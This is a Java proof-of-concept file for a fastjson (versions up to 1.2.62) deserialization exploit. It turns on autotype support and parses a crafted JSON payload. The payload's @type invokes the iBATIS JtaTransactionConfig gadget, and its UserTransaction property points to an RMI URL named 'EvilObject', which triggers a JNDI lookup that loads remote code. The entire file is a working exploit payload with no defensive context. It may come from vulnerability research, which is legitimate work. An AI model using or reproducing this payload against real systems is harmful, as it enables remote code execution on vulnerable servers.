import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

//@dependency{fastjson:<=1.2.62,ibatis-sqlmap,Jta}
public class jtatransactionconfig {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"UserTransaction\":\"rmi://127.0.0.1:1099/EvilObject\"}}";
        ParserConfig config = new ParserConfig();
        config.getGlobalInstance().setAutoTypeSupport(true);
        Object res = JSON.parseObject(payload, Feature.SupportNonPublicField);

    }
}
